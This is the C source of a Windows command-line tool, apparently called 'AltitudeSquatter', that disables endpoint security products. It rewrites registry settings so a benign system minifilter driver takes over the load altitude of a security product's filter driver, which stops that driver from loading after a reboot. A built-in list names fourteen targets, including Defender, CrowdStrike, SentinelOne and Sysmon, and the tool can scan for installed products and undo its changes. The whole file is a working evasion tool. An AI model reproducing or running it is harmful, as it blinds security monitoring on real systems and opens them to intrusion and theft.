#include <windows.h>
#include <stdio.h>
#include <string.h>

static BOOL SetRegSz(LPCSTR subKey, LPCSTR name, LPCSTR value)
{
    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Open %s failed (error %ld)\n", subKey, rc);
        return FALSE;
    }
    rc = RegSetValueExA(hKey, name, 0, REG_SZ, (const BYTE *)value, (DWORD)strlen(value) + 1);
    RegCloseKey(hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Set %s failed (error %ld)\n", name, rc);
        return FALSE;
    }
    return TRUE;
}

static BOOL SetRegDword(LPCSTR subKey, LPCSTR name, DWORD value)
{
    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Open %s failed (error %ld)\n", subKey, rc);
        return FALSE;
    }
    rc = RegSetValueExA(hKey, name, 0, REG_DWORD, (const BYTE *)&value, sizeof(value));
    RegCloseKey(hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Set %s failed (error %ld)\n", name, rc);
        return FALSE;
    }
    return TRUE;
}

static BOOL DeleteRegValue(LPCSTR subKey, LPCSTR name)
{
    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) return FALSE;
    rc = RegDeleteValueA(hKey, name);
    RegCloseKey(hKey);
    return rc == ERROR_SUCCESS;
}

static BOOL SvcKeyExists(const char *svcName)
{
    char subKey[512];
    _snprintf(subKey, sizeof(subKey), "SYSTEM\\CurrentControlSet\\Services\\%s", svcName);
    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey);
    if (rc == ERROR_SUCCESS) { RegCloseKey(hKey); return TRUE; }
    return FALSE;
}

typedef struct {
    const char *edr;
    const char *filter;
    const char *altitude;
    const char *decoy;
    const char *decoyInstance;
    const char *origAltitude;
    DWORD       origStart;
    const char *origGroup;
} Target;

static Target targets[] = {
    {"defender",    "WdFilter",        "328010", "npsvctrig",  "npsvctrig",  "46000",  3, NULL},
    {"mssecflt",    "MsSecFlt",        "385600", "WIMMount",   "WIMMount",   "385600", 0, "FSFilter Compression"},
    {"sysmon",      "SysmonDrv",       "385201", "storqosflt", "storqosflt", "244000", 3, NULL},
    {"crowdstrike", "csagent",         "328010", "npsvctrig",  "npsvctrig",  "46000",  3, NULL},
    {"sentinelone", "SentinelMonitor", "385200", "CldFlt",     "CldFlt",     "180451", 0, "FSFilter HSM"},
    {"carbonblack", "CbDefenseFilter", "328000", "Wof",        "Wof",        "40700",  0, "FSFilter Compression"},
    {"sophos",      "SophosED",        "326000", "wcifs",      "wcifs",      "189900", 0, NULL},
    {"eset",        "eamonm",          "328000", "Wof",        "Wof",        "40700",  0, "FSFilter Compression"},
    {"kaspersky",   "klif",            "389800", "FileCrypt",  "FileCrypt",  "141100", 3, NULL},
    {"trendmicro",  "TmFileEncDec",    "385300", "bindflt",    "bindflt",    "409800", 3, NULL},
    {"elastic",     "ElasticEndpoint", "385700", "luafv",      "luafv",      "135000", 2, "FSFilter Virtualization"},
    {"cortex",      "CyveraK",         "328010", "npsvctrig",  "npsvctrig",  "46000",  3, NULL},
    {"cylance",     "CylanceDrv",      "385100", "storqosflt", "storqosflt", "244000", 3, NULL},
    {"malwarebytes","MBAMSwissArmy",   "385100", "storqosflt", "storqosflt", "244000", 3, NULL},
};
#define TARGET_COUNT (sizeof(targets) / sizeof(targets[0]))

static int stricmp_local(const char *a, const char *b)
{
    while (*a && *b) {
        char ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
        char cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
        if (ca != cb) return ca - cb;
        a++; b++;
    }
    return *a - *b;
}

static void PrintUsage(void)
{
    printf("Usage: AltitudeSquatter.exe <command> [target ...]\n\n");
    printf("Commands:\n");
    printf("  list            Show detected EDR minifilters\n");
    printf("  all             Squat all detected EDR filters\n");
    printf("  restore         Restore all decoy drivers to defaults\n");
    printf("  <target>        Squat specific EDR (multiple allowed)\n");
    printf("  restore <target> Restore specific decoy to defaults\n\n");
    printf("Targets:\n");
    for (int i = 0; i < (int)TARGET_COUNT; i++)
        printf("  %-14s  %s (altitude %s)\n", targets[i].edr, targets[i].filter, targets[i].altitude);
}

static BOOL DoSquat(Target *t)
{
    char svcKey[512], instKey[512];
    _snprintf(svcKey, sizeof(svcKey), "SYSTEM\\CurrentControlSet\\Services\\%s", t->decoy);
    _snprintf(instKey, sizeof(instKey), "SYSTEM\\CurrentControlSet\\Services\\%s\\Instances\\%s",
              t->decoy, t->decoyInstance);

    printf("[*] %s -> altitude %s (displaces %s)\n", t->decoy, t->altitude, t->filter);

    if (!SvcKeyExists(t->decoy)) {
        printf("    [-] Decoy driver %s not found\n\n", t->decoy);
        return FALSE;
    }

    BOOL s1 = SetRegSz(instKey, "Altitude", t->altitude);
    BOOL s2 = SetRegDword(svcKey, "Start", 0);
    BOOL s3 = SetRegSz(svcKey, "Group", "FSFilter Bottom");

    if (s1 && s2 && s3) {
        printf("    [+] %s squatted\n\n", t->filter);
        return TRUE;
    }
    printf("    [-] Partial failure\n\n");
    return FALSE;
}

static BOOL DoRestore(Target *t)
{
    char svcKey[512], instKey[512];
    _snprintf(svcKey, sizeof(svcKey), "SYSTEM\\CurrentControlSet\\Services\\%s", t->decoy);
    _snprintf(instKey, sizeof(instKey), "SYSTEM\\CurrentControlSet\\Services\\%s\\Instances\\%s",
              t->decoy, t->decoyInstance);

    printf("[*] Restoring %s (altitude %s -> %s, Start -> %lu)\n",
           t->decoy, t->altitude, t->origAltitude, t->origStart);

    if (!SvcKeyExists(t->decoy)) {
        printf("    [-] Driver %s not found\n\n", t->decoy);
        return FALSE;
    }

    BOOL s1 = SetRegSz(instKey, "Altitude", t->origAltitude);
    BOOL s2 = SetRegDword(svcKey, "Start", t->origStart);
    BOOL s3;
    if (t->origGroup)
        s3 = SetRegSz(svcKey, "Group", t->origGroup);
    else
        s3 = DeleteRegValue(svcKey, "Group") || TRUE;

    if (s1 && s2 && s3) {
        printf("    [+] %s restored to defaults\n\n", t->decoy);
        return TRUE;
    }
    printf("    [-] Partial failure\n\n");
    return FALSE;
}

static Target *FindTarget(const char *name)
{
    for (int i = 0; i < (int)TARGET_COUNT; i++) {
        if (stricmp_local(name, targets[i].edr) == 0 ||
            stricmp_local(name, targets[i].filter) == 0)
            return &targets[i];
    }
    return NULL;
}

int main(int argc, char *argv[])
{
    printf("[*] Minifilter altitude squatter\n\n");

    if (argc < 2) {
        PrintUsage();
        return 0;
    }

    if (stricmp_local(argv[1], "list") == 0) {
        printf("[*] Scanning for EDR minifilters...\n\n");
        int found = 0;
        for (int i = 0; i < (int)TARGET_COUNT; i++) {
            if (SvcKeyExists(targets[i].filter)) {
                printf("  [!] %-14s  %s (altitude %s)\n", targets[i].edr, targets[i].filter, targets[i].altitude);
                found++;
            }
        }
        if (!found) printf("  [+] No known EDR minifilters detected\n");
        else printf("\n[*] %d EDR minifilter(s) detected\n", found);
        return 0;
    }

    if (stricmp_local(argv[1], "restore") == 0) {
        if (argc > 2) {
            for (int a = 2; a < argc; a++) {
                Target *t = FindTarget(argv[a]);
                if (t) DoRestore(t);
                else printf("[-] Unknown target: %s\n\n", argv[a]);
            }
        } else {
            printf("[*] Restoring all decoy drivers to defaults...\n\n");
            int ok = 0;
            for (int i = 0; i < (int)TARGET_COUNT; i++) {
                if (SvcKeyExists(targets[i].decoy))
                    if (DoRestore(&targets[i])) ok++;
            }
            printf("[+] %d driver(s) restored. Reboot to apply.\n", ok);
        }
        return 0;
    }

    if (stricmp_local(argv[1], "all") == 0) {
        int total = 0, ok = 0;
        for (int i = 0; i < (int)TARGET_COUNT; i++) {
            if (SvcKeyExists(targets[i].filter)) {
                total++;
                if (DoSquat(&targets[i])) ok++;
            }
        }
        if (total == 0) {
            printf("[+] No known EDR minifilters detected\n");
            return 0;
        }
        if (ok == total)
            printf("[+] All %d targets squatted. Reboot to apply.\n", ok);
        else
            printf("[!] %d/%d succeeded. Reboot to apply.\n", ok, total);
        return ok == total ? 0 : 1;
    }

    for (int a = 1; a < argc; a++) {
        Target *t = FindTarget(argv[a]);
        if (t) DoSquat(t);
        else printf("[-] Unknown target: %s\n\n", argv[a]);
    }

    printf("[*] Reboot to apply changes.\n");
    return 0;
}
